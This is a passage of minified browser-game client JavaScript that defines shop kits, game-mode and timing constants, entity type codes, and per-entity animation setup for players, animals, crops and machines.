          var i = I();
          var t = h.width;
          var r = h.height;
          var n = (t - h.width) / 2;
          var a = (r - h.height) / 2;
          Nn(e, i, h.translate.x - n, h.translate.y - a, t, r);
        };
        n = 1;
      } else {
        d = function (e) {
          Nn(e, I(), h.translate.x, h.translate.y);
        };
      }
      return {
        info: h,
        trigger: function (e, i, t) {
          if (u(i)) {
            if (t == jo) {
              h.state = es;
            } else if (t == Zo || t == qo && h.state != es) {
              h.state = $o;
            }
            return true;
          } else {
            h.state = Qo;
            return false;
          }
        },
        draw: d,
        in_button: u
      };
    }
    function ns(e, i, t, r, n) {
      var a = {
        x: t,
        y: r,
        _x: t,
        _y: r
      };
      return {
        translate: a,
        draw: function (i) {
          Nn(i, e, a.x, a.y, e.width / 2, e.height / 2);
        },
        active: i,
        position: n
      };
    }
    var as = "send";
    var os = Utils.getURLData("id") === "1" ? 1 : 0;
    var ss = Utils.getURLData("password");
    var _s = "https://matchmaker.api.rivet.gg/v1";
    var Es = {
      DELETE: 1,
      HURT: 2,
      COLD: 4,
      HUNGER: 8,
      ATTACK: 16,
      WALK: 32,
      IDLE: 64,
      HEAL: 128,
      WEB: 256
    };
    var Ts = [{
      price: 1000,
      items: [[2, le.FIRE], [1, le.COOKED_MEAT], [8, le.PLANT], [1, le.BREAD]]
    }, {
      price: 2000,
      items: [[2, le.BIG_FIRE], [1, le.PICK_WOOD], [2, le.COOKED_MEAT], [16, le.PLANT], [2, le.BREAD]]
    }, {
      price: 4000,
      items: [[3, le.BIG_FIRE], [1, le.PICK], [4, le.COOKED_MEAT], [20, le.PLANT], [4, le.BREAD], [1, le.WORKBENCH], [80, le.STONE], [140, le.WOOD]]
    }, {
      price: 8000,
      items: [[1, le.BAG], [4, le.BIG_FIRE], [1, le.PICK_GOLD], [6, le.COOKED_MEAT], [30, le.PLANT], [6, le.BREAD], [1, le.WORKBENCH], [150, le.STONE], [200, le.WOOD], [60, le.GOLD], [2, le.BOTTLE_FULL]]
    }, {
      price: 16000,
      items: [[1, le.BAG], [1, le.PICK_DIAMOND], [1, le.BED], [7, le.CAKE], [2, le.BOTTLE_FULL], [2, le.BIG_FIRE], [1, le.FURNACE], [15, le.STONE_WALL], [2, le.STONE_DOOR], [1, le.TOTEM], [1, le.SPANNER], [200, le.STONE], [300, le.WOOD]]
    }, {
      price: 16000,
      items: [[1, le.BAG], [1, le.COAT], [1, le.SHOVEL_GOLD], [1, le.PICK_GOLD], [10, le.CAKE], [4, le.BOTTLE_FULL], [6, le.BIG_FIRE], [3, le.BANDAGE], [1, le.BOOK], [200, le.STONE], [300, le.WOOD]]
    }, {
      price: 16000,
      items: [[1, le.BAG], [1, le.HOOD], [1, le.HAMMER_GOLD], [3, le.BANDAGE], [1, 0], [1, le.PICK_GOLD], [7, le.CAKE], [2, le.BOTTLE_FULL], [4, le.BIG_FIRE], [150, le.STONE], [200, le.WOOD], [1, le.LOCKPICK]]
    }, {
      price: 16000,
      items: [[1, le.BAG], [1, le.PEASANT], [1, le.PICK_GOLD], [7, le.CAKE], [2, le.BOTTLE_FULL], [4, le.BIG_FIRE], [2, le.WINDMILL], [4, le.BREAD_OVEN], [10, le.PLOT], [6, le.WHEAT_SEED], [4, le.SEED], [1, le.WATERING_CAN_FULL], [500, le.WOOD]]
    }, {
      price: 16000,
      items: [[1, le.BAG], [1, le.PICK_GOLD], [16, le.FOODFISH_COOKED], [1, le.BOTTLE_FULL], [6, le.BIG_FIRE], [3, le.BANDAGE], [1, le.DIVING_MASK], [1, le.SWORD], [16, le.BRIDGE], [150, le.STONE], [200, le.WOOD]]
    }, {
      price: 20000,
      items: [[1, le.BAG], [1, le.PICK_GOLD], [1, le.CAKE], [1, le.BOTTLE_FULL], [3, le.BIG_FIRE], [3, le.BANDAGE], [1, le.GOLD_HELMET], [1, le.SWORD_GOLD], [1, le.DIAMOND_SPEAR], [2, le.GOLD_SPIKE], [50, le.STONE], [100, le.WOOD]]
    }];
    var As = {
      VERSION_NUMBER: 52,
      TIMEOUT_TIME: 2000,
      TIMEOUT_NUMBER: 3,
      PING: "[13]",
      PING_DELAY: 60000,
      ROTATE: 0.2,
      ATTACK: 0.2,
      SLOW_ATTACK: 0.58,
      CAM_DELAY: 50,
      MUTE_DELAY: 125000,
      TIMEOUT_SERVER: 600000,
      WAITING_FOR_SERVER: 8000,
      DELAY_CONNECTION_UPDATE: 5,
      LAG_DISTANCE: 200,
      LOOSE_FOCUS: 15,
      TOKEN_LEN: 14,
      TEAM_MANAGE: 0,
      TEAM_SHOW: 1,
      TEAM_LEAVE: 2,
      TEAM_JOIN: 3,
      TEAM_FULL: 4,
      SKIN_MAX: 20,
      ACCESSORY_MAX: 14,
      SYMBOL_MAX: 4
    };
    var ds = {
      DAY: 480000,
      WITHOUT_BAG: 10,
      WITH_BAG: 16,
      BAG_SIZE: 6,
      GHOST_DELAY: 60,
      TOP: 1,
      BOTTOM: 2,
      LEFT: 4,
      RIGHT: 8,
      ROTATE: 10,
      DIST_CHEST: 100,
      DIST_FURNACE: 100,
      DIST_WINDMILL: 100,
      DIST_WELL: 100,
      DIST_BREAD_OVEN: 100,
      DIST_SIGN: 100,
      DIST_TOTEM: 100,
      DIST_SIGN: 100,
      DIST_RESURRECTION: 100,
      DIST_EXTRACTOR_MACHINE: 100,
      MODE_PVP: 0,
      MODE_HUNGER_GAMES: 1,
      MODE_ZOMBIES: 2,
      MODE_VAMPIRES: 3,
      MODE_LEGACY: 4,
      MODE_BR: 5,
      MODE_COMMUNITY: 6,
      MODE_EXPERIMENTAL: 7,
      RIVET_GAME_MODES: {
        0: "normal",
        2: "zombies",
        3: "vampires",
        4: "forest",
        7: "experimental"
      },
      ZOMBIE_SKIN: 0,
      VAMPIRE_SKIN: 0,
      ROBOT_SKIN: 30,
      GHOST: 2,
      GHOST_DELAY: 60000,
      WT1SY: 0,
      LWT1SY: 0,
      WT1EY: 50,
      WT2SY: 0,
      LWT2SY: 40,
      WT2EY: 39,
      LWT2: 830,
      FLOAM_X: 25,
      FLOAM_Y: 8,
      W1SX: 0,
      LW1SX: 0,
      W1EX: 200,
      W2SX: 0,
      LW2SX: 250,
      W2EX: 150,
      W3SX: 0,
      LW3SX: 350,
      W3EX: 100,
      LSANDX: 700,
      SEED: 39879
    };
    var hs = [];
    for (Me = 0; Me < 500; Me++) {
      hs[Me] = 0;
    }
    hs[Ie.SUPER_DIVING_SUIT] = 1;
    hs[Ie.SWORD_WOOD] = 1;
    hs[Ie.SWORD] = 1;
    hs[Ie.SWORD_GOLD] = 1;
    hs[Ie.SWORD_DIAMOND] = 1;
    hs[Ie.SWORD_AMETHYST] = 1;
    hs[Ie.REIDITE_SWORD] = 1;
    hs[Ie.PIRATE_SWORD] = 1;
    hs[Ie.DRAGON_SWORD] = 1;
    hs[Ie.LAVA_SWORD] = 1;
    hs[Ie.SPEAR] = 1;
    hs[Ie.GOLD_SPEAR] = 1;
    hs[Ie.DIAMOND_SPEAR] = 1;
    hs[Ie.AMETHYST_SPEAR] = 1;
    hs[Ie.REIDITE_SPEAR] = 1;
    hs[Ie.DRAGON_SPEAR] = 1;
    hs[Ie.LAVA_SPEAR] = 1;
    hs[Ie.WOOD_SPEAR] = 1;
    hs[Ie.CRAB_SPEAR] = 1;
    var Is = [{
      time: 2880000
    }, {
      time: 1440000
    }, {
      time: 1920000
    }, {
      time: 1440000
    }, {
      time: 2880000
    }, {
      time: 2400000
    }, {
      time: 2400000
    }, {
      time: 4800000
    }, {
      time: 2880000
    }, {
      time: 3360000
    }, {
      time: 2880000
    }, {
      time: 3840000
    }, {
      time: 3360000
    }];
    var us = {
      PLAYERS: 0,
      FIRE: 1,
      WORKBENCH: 2,
      SEED: 3,
      WALL: 4,
      SPIKE: 5,
      BIG_FIRE: 6,
      STONE_WALL: 7,
      GOLD_WALL: 8,
      DIAMOND_WALL: 9,
      WOOD_DOOR: 10,
      CHEST: 11,
      STONE_SPIKE: 12,
      GOLD_SPIKE: 13,
      DIAMOND_SPIKE: 14,
      STONE_DOOR: 15,
      GOLD_DOOR: 16,
      DIAMOND_DOOR: 17,
      FURNACE: 18,
      AMETHYST_WALL: 19,
      AMETHYST_SPIKE: 20,
      AMETHYST_DOOR: 21,
      RESURRECTION: 22,
      EMERALD_MACHINE: 23,
      EXTRACTOR_MACHINE_STONE: 24,
      EXTRACTOR_MACHINE_GOLD: 25,
      EXTRACTOR_MACHINE_DIAMOND: 26,
      EXTRACTOR_MACHINE_AMETHYST: 27,
      EXTRACTOR_MACHINE_REIDITE: 28,
      TOTEM: 29,
      BRIDGE: 30,
      WHEAT_SEED: 31,
      WINDMILL: 32,
      PLOT: 33,
      BREAD_OVEN: 34,
      WELL: 35,
      SIGN: 36,
      PUMPKIN_SEED: 37,
      ROOF: 38,
      GARLIC_SEED: 39,
      THORNBUSH_SEED: 40,
      BED: 41,
      GARLAND: 42,
      TOMATO_SEED: 43,
      CARROT_SEED: 44,
      WOOD_DOOR_SPIKE: 45,
      STONE_DOOR_SPIKE: 46,
      GOLD_DOOR_SPIKE: 47,
      DIAMOND_DOOR_SPIKE: 48,
      AMETHYST_DOOR_SPIKE: 49,
      REIDITE_WALL: 50,
      REIDITE_DOOR: 51,
      REIDITE_SPIKE: 52,
      REIDITE_DOOR_SPIKE: 53,
      WATERMELON_SEED: 54,
      ALOE_VERA_SEED: 55,
      WOOD_TOWER: 56,
      WOLF: 60,
      SPIDER: 61,
      FOX: 62,
      BEAR: 63,
      DRAGON: 64,
      PIRANHA: 65,
      KRAKEN: 66,
      CRAB: 67,
      FLAME: 68,
      LAVA_DRAGON: 69,
      BOAR: 70,
      CRAB_BOSS: 71,
      BABY_DRAGON: 72,
      BABY_LAVA: 73,
      HAWK: 74,
      VULTURE: 75,
      SAND_WORM: 76,
      BABY_MAMMOTH: 77,
      MAMMOTH: 78,
      WHEAT_MOB: 79,
      RABBIT: 80,
      TREASURE_CHEST: 81,
      DEAD_BOX: 82,
      PUMPKIN_MOB: 83,
      GARLIC_MOB: 84,
      THORNBUSH_MOB: 85,
      CRATE: 86,
      GIFT: 87,
      PENGUIN: 88,
      ALOE_VERA_MOB: 89,
      FIREFLY: 90,
      SPELL: 91,
      FRUIT: 100
    };
    var ls = [[us.EXTRACTOR_MACHINE_STONE, le.STONE], [us.EXTRACTOR_MACHINE_GOLD, le.GOLD], [us.EXTRACTOR_MACHINE_DIAMOND, le.DIAMOND], [us.EXTRACTOR_MACHINE_AMETHYST, le.AMETHYST], [us.EXTRACTOR_MACHINE_REIDITE, le.REIDITE]];
    function Os() {
      this.nickname = "";
      this.skin = 0;
      this.accessory = 0;
      this.bag = 0;
      this.baglook = 0;
      this.book = 0;
      this.crate = 0;
      this.dead = 0;
      this.level = 0;
      this.label = null;
      this.label_winter = null;
      this.ldb_label = null;
      this.alive = false;
      this.score = 0;
    }
    function cs(e, i, n, a, o, s, _, E, T, A) {
      this.type = e;
      this.pid = i;
      this.id = n;
      this.x = a;
      this.y = o;
      this.angle = s;
      this.nangle = s;
      this.action = _;
      this.info = E;
      this.extra = A;
      this.r = {
        x: a,
        y: o
      };
      this.speed = T;
      this.time = Date.now();
      this.health = t.getHealth(this.type, this.info);
      this.hited = 0;
      this.damaged = 0;
      if (!r.visuals.info.playerinfo.l[this.pid] && this.pid != 0 || r.visuals.info.playerinfo.l[this.pid] < this.id) {
        r.visuals.info.playerinfo.l[this.pid] = this.id;
      }
      if (s_) {
        this.uid = i * s_.max_units + n;
      }
      switch (e) {
        case us.PLAYERS:
          this.player = s_.players[this.pid];
          this.skin = this.player.skin;
          this.baglook = this.player.baglook;
          this.book = this.player.book;
          this.accessory = this.player.accessory;
          this.dist_forest = -1000000;
          this.dist_lava = -1000000;
          this.dist_winter = -1000000;
          this.dist_desert = -1000000;
          this.dist_water = -1000000;
          this.dist_sand = -1000000;
          this.dist_dragon = -1000000;
          this.zombie = s_.mode === ds.MODE_ZOMBIES && this.skin === ds.ZOMBIE_SKIN;
          this.vampire = s_.mode === ds.MODE_VAMPIRES && this.skin === ds.VAMPIRE_SKIN;
          this.superzombie = !(!this.zombie || this.player.nickname !== "  ");
          this.foot = [];
          this.tower = 0;
          this.move_effect = true;
          this.id_foot = 0;
          this.fly = 0;
          this.swim = [];
          this.r = {
            x: a,
            y: o
          };
          this.draw = Ao;
          this.draw_vehicle = Eo;
          this.vehicle_fx1 = 0;
          this.vehicle_fx2 = 0;
          this.vehicle_fx3 = 0;
          this.vehicle_fx4 = new Utils.LinearAnimation(false, 0, 0, -Math.PI / 6, 0.5, 1);
          this.vehicle_fx5 = 0;
          this.tower_fx = 0;
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          this.heal = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          this.freeze = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          this.starve = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          this.idle = new Utils.LinearAnimation(true, 0, 2.25, -1.5, 3.75, 7.5);
          this.walk = new Utils.LinearAnimation(true, 0, 7.5, -3, 22.5, 33.75);
          this.attack = new Utils.LinearAnimation(false, 0, 0, -Math.PI / 3, 6, 9);
          this.slow_attack = 0;
          this.web = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 1, 3);
          this.move_head = this.superzombie ? new Utils.LinearAnimation(true, 0, 2.25, -1.5, 2.75, 5.5) : 0;
          this.angle_init = 0;
          this.text_ease = 0;
          this.text_effect = [];
          this.text_move = [];
          this.text = [];
          this.label = [];
          this.draw_text = lo;
          this.hand = true;
          this.right = -1;
          this.vehicle = -1;
          this.action = Es.IDLE;
          this.collide = false;
          this.clothe = 0;
          this.ghost = false;
          this.bubbles = [];
          this.bag = 0;
          this.sid = -1;
          this.update = function (e) {
            if (this.info & 32768) {
              this.collide = true;
              this.info = this.info & -32769;
            } else {
              this.collide = false;
            }
            if (this.info & 16384) {
              this.info = this.info & -16385;
              this.bag = 1;
            } else {
              this.bag = 0;
            }
            this.clothe = Math.floor(this.info / 128);
            this.info -= this.clothe * 128;
            if (this.info === le.HAND || this.superzombie) {
              this.right = -1;
            } else {
              this.right = this.info;
            }
            this.tower = s_.find_tower(Math.floor(this.r.y / 100), Math.floor(this.r.x / 100));
            this.vehicle = this.extra & 255;
            if (this.right === ds.GHOST) {
              this.ghost = true;
            } else {
              this.ghost = false;
            }
            if (hs[this.right]) {
              this.weapon = true;
            } else {
              this.weapon = false;
            }
            if (e & Es.WEB) {
              this.web.o = false;
              this.web.v = 0.6;
            } else if (e & Es.COLD) {
              this.freeze.o = false;
              this.freeze.v = 0.6;
            } else if (e & Es.HEAL) {
              this.heal.o = false;
              this.heal.v = 0.6;
            }
            if (e & Es.HUNGER) {
              this.starve.o = false;
              this.starve.v = 0.6;
            }
            if (e & Es.HURT) {
              this.hit.o = false;
              this.hit.v = 0.6;
            }
            if (e & Es.ATTACK) {
              this.slow_attack = As.SLOW_ATTACK;
              if (A_.run && this.sid !== -1) {
                A_.players[this.sid].swing($s[this.right]);
              }
            }
          };
          this.update();
          break;
        case us.EMERALD_MACHINE:
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.draw_bg = to;
          this.draw_fg = eo;
          this.halo = new Utils.LinearAnimation(false, 1, 1.23, 1.18, 0.01, 0.01);
          this.rotate1 = 0;
          this.rotate2 = 0;
          this.draw_life = ra;
          break;
        case us.RESURRECTION:
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.draw_bg = ro;
          this.draw_fg = io;
          this.halo = new Utils.LinearAnimation(false, 1, 1.23, 1.18, 0.01, 0.01);
          this.rotate1 = 0;
          this.rotate2 = 0;
          break;
        case us.FIRE:
        case us.BIG_FIRE:
          this.draw_bg = ka;
          this.draw_fg = ao;
          this.fire = new Utils.LinearAnimation(false, 1, 1.03, 0.98, 0.3, 0.3);
          this.ground = new Utils.LinearAnimation(false, 1, 1.23, 1.18, 0.01, 0.01);
          this.halo = new Utils.LinearAnimation(false, 1, 1.23, 1.18, 0.01, 0.01);
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          break;
        case us.TOMATO_SEED:
          this.draw_bg = Va;
          this.draw_fg = wa;
          this.ground = new Utils.LinearAnimation(false, 0.9, 1.05, 0.9, 0.2, 0.2);
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.fruits = [];
          for (var d = 0; d < 3; d++) {
            this.fruits.push({
              draw: va,
              breath: new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2)
            });
          }
          this.fruits[0].x = this.x - 16.5;
          this.fruits[0].y = this.y - 15.5;
          this.fruits[0].angle = this.angle;
          this.fruits[1].x = this.x + 36;
          this.fruits[1].y = this.y + 17;
          this.fruits[1].angle = this.angle;
          this.fruits[2].x = this.x - 18.5;
          this.fruits[2].y = this.y + 39;
          this.fruits[2].angle = this.angle;
          break;
        case us.SEED:
          this.draw_bg = za;
          this.draw_fg = Wa;
          this.ground = new Utils.LinearAnimation(false, 0.9, 1.05, 0.9, 0.2, 0.2);
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.fruits = [];
          for (d = 0; d < 3; d++) {
            this.fruits.push({
              draw: Ma,
              breath: new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2)
            });
          }
          this.fruits[0].x = this.x - 16.5;
          this.fruits[0].y = this.y - 15.5;
          this.fruits[1].x = this.x - 5.5;
          this.fruits[1].y = this.y + 7.5;
          this.fruits[2].x = this.x + 18;
          this.fruits[2].y = this.y - 5;
          break;
        case us.BABY_MAMMOTH:
          this.draw = Ca;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.BOAR:
          this.draw = Na;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.CRAB_BOSS:
          this.draw = ba;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.breathl = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.breathr = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          this.heal = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.CRAB:
          this.draw = Da;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.breathl = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.breathr = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          this.heal = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.FLAME:
          this.draw = ma;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.FIREFLY:
          this.draw = pa;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.5, 0.5);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.SPELL:
          this.spell = this.info & 15;
          this.fly = this.extra & 1;
          this.born = 0;
          this.x = this.info;
          this.y = this.extra;
          this.draw = Sa;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.6, 0.6);
          break;
        case us.RABBIT:
        case us.WOLF:
        case us.SPIDER:
        case us.FOX:
        case us.BEAR:
        case us.MAMMOTH:
        case us.PIRANHA:
        case us.KRAKEN:
        case us.PENGUIN:
          this.draw = pa;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.SIGN:
          this.draw = Fa;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          break;
        case us.BREAD_OVEN:
          this.draw_fg = Ya;
          this.draw = xa;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.up = new Utils.LinearAnimation(false, 1, 1.03, 0.98, 0.1, 0.1);
          this.smog = [];
          break;
        case us.GIFT:
          this.angle = Math.random() * Math.PI / 2;
        case us.CRATE:
        case us.DEAD_BOX:
          this.draw = ca;
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.TREASURE_CHEST:
          this.draw = Ra;
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.LAVA_DRAGON:
          this.scale = 1;
          this.draw = la;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.rotate = new Utils.LinearAnimation(false, 0, 0, -Math.PI / 6, 0.5, 1);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.SAND_WORM:
          this.dig = 0;
          this.ground = [];
          this.groundTimer = 0;
          this.draw_ground = Ta;
          this.draw = Aa;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.rotate = new Utils.LinearAnimation(false, 0, 0, -Math.PI / 6, 0.5, 1);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.VULTURE:
          this.x = this.info;
          this.y = this.extra;
          this.scale = 1;
          this._alpha = 0;
          this.draw = da;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.rotate = new Utils.LinearAnimation(false, 0, 0, -Math.PI / 6, 0.5, 1);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.HAWK:
          this.x = this.info;
          this.y = this.extra;
          this.scale = 1;
          this._alpha = 0;
          this.draw = ha;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.rotate = new Utils.LinearAnimation(false, 0, 0, -Math.PI / 6, 0.5, 1);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.BABY_LAVA:
          this.scale = 1;
          this.draw = Ia;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.rotate = new Utils.LinearAnimation(false, 0, 0, -Math.PI / 6, 0.5, 1);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.BABY_DRAGON:
          this.scale = 1;
          this.draw = ua;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.rotate = new Utils.LinearAnimation(false, 0, 0, -Math.PI / 6, 0.5, 1);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.DRAGON:
          this.scale = 1;
          this.draw = Oa;
          this.breath = new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2);
          this.rotate = new Utils.LinearAnimation(false, 0, 0, -Math.PI / 6, 0.5, 1);
          this.hit = new Utils.LinearAnimation(false, 0.6, 0.6, 0, 5, 3);
          break;
        case us.FRUIT:
          this.fruits = [];
          for (d = 0; d < 5; d++) {
            this.fruits.push({
              draw: Ma,
              breath: new Utils.LinearAnimation(false, 0.9 + Math.random() * 0.15, 1.05, 0.9, 0.2, 0.2)
            });
          }
          switch (this.id % 3) {
            case 0:
              this.fruits[0].x = this.x - 20.5;
              this.fruits[0].y = this.y - 22.5;
              this.fruits[1].x = this.x - 35.5;
              this.fruits[1].y = this.y + 7.5;
              this.fruits[2].x = this.x + 7.5;
              this.fruits[2].y = this.y - 30;
              this.fruits[3].x = this.x + 22.5;
              this.fruits[3].y = this.y;
              this.fruits[4].x = this.x - 7.5;
              this.fruits[4].y = this.y + 14.5;
              break;
            case 1:
              this.fruits[0].x = this.x - 30.5;
              this.fruits[0].y = this.y - 22.5;
              this.fruits[1].x = this.x - 15.5;
              this.fruits[1].y = this.y + 7.5;
              this.fruits[2].x = this.x + 15.5;
              this.fruits[2].y = this.y - 30;
              this.fruits[3].x = this.x + 12.5;
              this.fruits[3].y = this.y + 5;
              this.fruits[4].x = this.x - 40.5;
              this.fruits[4].y = this.y + 14.5;
              break;
            case 2:
              this.fruits[0].x = this.x - 20.5;
              this.fruits[0].y = this.y - 20.5;
              this.fruits[1].x = this.x - 35.5;
              this.fruits[1].y = this.y + 15.5;
              this.fruits[2].x = this.x + 7.5;
              this.fruits[2].y = this.y - 17;
              this.fruits[3].x = this.x + 22.5;
              this.fruits[3].y = this.y + 5;
              this.fruits[4].x = this.x - 7.5;
              this.fruits[4].y = this.y + 1.5;
          }
          break;
        case us.WHEAT_SEED:
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.draw = Ba;
          this.ground = new Utils.LinearAnimation(false, 0.9, 1.05, 0.9, 0.2, 0.2);
          this.wind = new Utils.LinearAnimation(false, 0, Math.PI / 30, -Math.PI / 30, 0.06, 0.06);
          break;
        case us.THORNBUSH_SEED:
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.draw = La;
          this.ground = new Utils.LinearAnimation(false, 0.9, 1.05, 0.9, 0.2, 0.2);
          break;
        case us.GARLIC_SEED:
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.draw = Ga;
          this.ground = new Utils.LinearAnimation(false, 0.9, 1.05, 0.9, 0.2, 0.2);
          break;
        case us.CARROT_SEED:
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.draw = Pa;
          this.ground = new Utils.LinearAnimation(false, 0.9, 1.05, 0.9, 0.2, 0.2);
          break;
        case us.ALOE_VERA_SEED:
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.draw = fa;
          this.ground = new Utils.LinearAnimation(false, 0.9, 1.05, 0.9, 0.2, 0.2);
          break;
        case us.WATERMELON_SEED:
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.draw = Ha;
          this.ground = new Utils.LinearAnimation(false, 0.9, 1.05, 0.9, 0.2, 0.2);
          break;
        case us.PUMPKIN_SEED:
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.draw = ya;
          this.ground = new Utils.LinearAnimation(false, 0.9, 1.05, 0.9, 0.2, 0.2);
          break;
        case us.EXTRACTOR_MACHINE_STONE:
          this.draw = Xa;
          this.rotate = 0;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          break;
        case us.EXTRACTOR_MACHINE_GOLD:
          this.draw = qa;
          this.rotate = 0;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          break;
        case us.EXTRACTOR_MACHINE_DIAMOND:
          this.draw = ja;
          this.rotate = 0;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          break;
        case us.EXTRACTOR_MACHINE_AMETHYST:
          this.draw = Za;
          this.rotate = 0;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          break;
        case us.EXTRACTOR_MACHINE_REIDITE:
          this.draw = Qa;
          this.rotate = 0;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          break;
        case us.WINDMILL:
          this.draw_bg = $a;
          this.draw_fg = Ja;
          this.rotate = 0;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          break;
        case us.ROOF:
          this.draw = na;
          this.j = Math.floor(this.x / 100);
          this.i = Math.floor(this.y / 100);
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.opacity = 1;
          this.draw_life = ta;
          break;
        case us.GARLAND:
          this.draw = aa;
          this.halo = new Utils.LinearAnimation(false, 1, 1.15, 1, 0.3, 0.3);
          this.color = 0;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
